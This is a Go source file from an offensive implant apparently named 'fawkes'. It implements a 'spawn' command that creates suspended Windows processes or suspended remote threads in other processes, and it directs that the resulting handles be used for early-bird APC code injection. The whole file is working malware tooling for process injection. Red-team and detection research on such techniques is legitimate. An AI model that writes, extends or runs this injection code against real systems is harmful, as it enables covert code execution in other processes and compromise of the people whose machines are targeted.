//go:build windows
// +build windows

// Package commands provides the spawn command for creating suspended processes and threads.
//
// This command supports two modes:
// - Process: Creates a new process in suspended state using CreateProcess with CREATE_SUSPENDED
// - Thread: Creates a new suspended thread in an existing process using CreateRemoteThread
//
// The returned PID/TID can be used with apc-injection for early bird injection techniques.
package commands

import (
	"encoding/json"
	"fmt"
	"runtime"
	"strings"
	"syscall"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

// Process creation flags
const (
	CREATE_SUSPENDED = 0x00000004
)

// Thread creation flags
const (
	THREAD_CREATE_SUSPENDED = 0x00000004
)

// STARTUPINFO structure for CreateProcess
type STARTUPINFO struct {
	Cb            uint32
	Reserved      *uint16
	Desktop       *uint16
	Title         *uint16
	X             uint32
	Y             uint32
	XSize         uint32
	YSize         uint32
	XCountChars   uint32
	YCountChars   uint32
	FillAttribute uint32
	Flags         uint32
	ShowWindow    uint16
	CbReserved2   uint16
	LpReserved2   *byte
	StdInput      windows.Handle
	StdOutput     windows.Handle
	StdError      windows.Handle
}

// PROCESS_INFORMATION structure returned by CreateProcess
type PROCESS_INFORMATION struct {
	Process   windows.Handle
	Thread    windows.Handle
	ProcessId uint32
	ThreadId  uint32
}

// Note: kernel32, procOpenProcess, procCreateRemoteThread, procCloseHandle are defined in vanillainjection.go

var (
	procCreateProcessW   = kernel32.NewProc("CreateProcessW")
	procGetModuleHandleW = kernel32.NewProc("GetModuleHandleW")
	procGetProcAddressA  = kernel32.NewProc("GetProcAddress")
)

// SpawnCommand implements the spawn command
type SpawnCommand struct{}

// Name returns the command name
func (c *SpawnCommand) Name() string {
	return "spawn"
}

// Description returns the command description
func (c *SpawnCommand) Description() string {
	return "Spawn a suspended process or thread for injection techniques"
}

// SpawnParams represents the parameters for spawn
type SpawnParams struct {
	Mode string `json:"mode"` // "process" or "thread"
	Path string `json:"path"` // For process mode: executable path or name
	PID  int    `json:"pid"`  // For thread mode: target process ID
}

// Execute executes the spawn command
func (c *SpawnCommand) Execute(task structs.Task) structs.CommandResult {
	if runtime.GOOS != "windows" {
		return structs.CommandResult{
			Output:    "Error: This command is only supported on Windows",
			Status:    "error",
			Completed: true,
		}
	}

	var params SpawnParams
	err := json.Unmarshal([]byte(task.Params), &params)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	params.Mode = strings.ToLower(params.Mode)

	switch params.Mode {
	case "process":
		return spawnSuspendedProcess(params.Path)
	case "thread":
		return spawnSuspendedThread(params.PID)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: Unknown mode '%s'. Use 'process' or 'thread'", params.Mode),
			Status:    "error",
			Completed: true,
		}
	}
}

// spawnSuspendedProcess creates a new process in suspended state
func spawnSuspendedProcess(path string) structs.CommandResult {
	var output string
	output += "[*] Spawn Mode: Suspended Process\n"

	if path == "" {
		return structs.CommandResult{
			Output:    output + "Error: No executable path specified",
			Status:    "error",
			Completed: true,
		}
	}

	output += fmt.Sprintf("[*] Target executable: %s\n", path)

	// Convert path to UTF16 for CreateProcessW
	commandLine, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("Error converting path: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	var startupInfo STARTUPINFO
	var processInfo PROCESS_INFORMATION

	startupInfo.Cb = uint32(unsafe.Sizeof(startupInfo))

	// Call CreateProcessW with CREATE_SUSPENDED flag
	ret, _, err := procCreateProcessW.Call(
		0,                                    // lpApplicationName (NULL - use command line)
		uintptr(unsafe.Pointer(commandLine)), // lpCommandLine
		0,                                    // lpProcessAttributes
		0,                                    // lpThreadAttributes
		0,                                    // bInheritHandles
		uintptr(CREATE_SUSPENDED),            // dwCreationFlags
		0,                                    // lpEnvironment
		0,                                    // lpCurrentDirectory
		uintptr(unsafe.Pointer(&startupInfo)),
		uintptr(unsafe.Pointer(&processInfo)),
	)

	if ret == 0 {
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("Error: CreateProcess failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	output += "[+] Process created successfully in SUSPENDED state\n"
	output += fmt.Sprintf("[+] Process ID (PID): %d\n", processInfo.ProcessId)
	output += fmt.Sprintf("[+] Thread ID (TID): %d\n", processInfo.ThreadId)
	output += fmt.Sprintf("[+] Process Handle: 0x%X\n", processInfo.Process)
	output += fmt.Sprintf("[+] Thread Handle: 0x%X\n", processInfo.Thread)
	output += "\n[*] Use these values with apc-injection:\n"
	output += fmt.Sprintf("    PID: %d\n", processInfo.ProcessId)
	output += fmt.Sprintf("    TID: %d\n", processInfo.ThreadId)

	// Note: We intentionally do NOT close the handles here
	// The process needs to stay alive for injection
	// The handles will be cleaned up when the agent process exits
	// or when the injected process terminates

	return structs.CommandResult{
		Output:    output,
		Status:    "success",
		Completed: true,
	}
}

// spawnSuspendedThread creates a new suspended thread in an existing process
func spawnSuspendedThread(pid int) structs.CommandResult {
	var output string
	output += "[*] Spawn Mode: Suspended Thread\n"

	if pid <= 0 {
		return structs.CommandResult{
			Output:    output + "Error: Invalid PID specified",
			Status:    "error",
			Completed: true,
		}
	}

	output += fmt.Sprintf("[*] Target PID: %d\n", pid)

	// Open handle to target process
	hProcess, _, err := procOpenProcess.Call(
		uintptr(PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_READ|PROCESS_VM_WRITE),
		0,
		uintptr(pid),
	)

	if hProcess == 0 {
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("Error: OpenProcess failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	output += fmt.Sprintf("[+] Opened process handle: 0x%X\n", hProcess)

	// Get address of kernel32!Sleep as a benign start address
	// The thread will be suspended before it executes, so this is just a placeholder
	kernel32Name, _ := syscall.UTF16PtrFromString("kernel32.dll")
	hKernel32, _, _ := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(kernel32Name)))

	if hKernel32 == 0 {
		windows.CloseHandle(windows.Handle(hProcess))
		return structs.CommandResult{
			Output:    output + "Error: Failed to get kernel32.dll handle",
			Status:    "error",
			Completed: true,
		}
	}

	sleepProc, _ := syscall.BytePtrFromString("Sleep")
	sleepAddr, _, _ := procGetProcAddressA.Call(hKernel32, uintptr(unsafe.Pointer(sleepProc)))

	if sleepAddr == 0 {
		windows.CloseHandle(windows.Handle(hProcess))
		return structs.CommandResult{
			Output:    output + "Error: Failed to get Sleep address",
			Status:    "error",
			Completed: true,
		}
	}

	output += fmt.Sprintf("[*] Using kernel32!Sleep (0x%X) as thread start address\n", sleepAddr)

	// Create suspended thread
	var threadId uint32
	hThread, _, err := procCreateRemoteThread.Call(
		hProcess,
		0,                              // lpThreadAttributes
		0,                              // dwStackSize (default)
		sleepAddr,                      // lpStartAddress
		uintptr(0xFFFFFFFF),            // lpParameter (INFINITE sleep if ever resumed without APC)
		uintptr(THREAD_CREATE_SUSPENDED), // dwCreationFlags
		uintptr(unsafe.Pointer(&threadId)),
	)

	if hThread == 0 {
		windows.CloseHandle(windows.Handle(hProcess))
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("Error: CreateRemoteThread failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	output += "[+] Thread created successfully in SUSPENDED state\n"
	output += fmt.Sprintf("[+] Thread ID (TID): %d\n", threadId)
	output += fmt.Sprintf("[+] Thread Handle: 0x%X\n", hThread)
	output += "\n[*] Use these values with apc-injection:\n"
	output += fmt.Sprintf("    PID: %d\n", pid)
	output += fmt.Sprintf("    TID: %d\n", threadId)

	// Note: We don't close handles - needed for the thread to stay valid

	return structs.CommandResult{
		Output:    output,
		Status:    "success",
		Completed: true,
	}
}
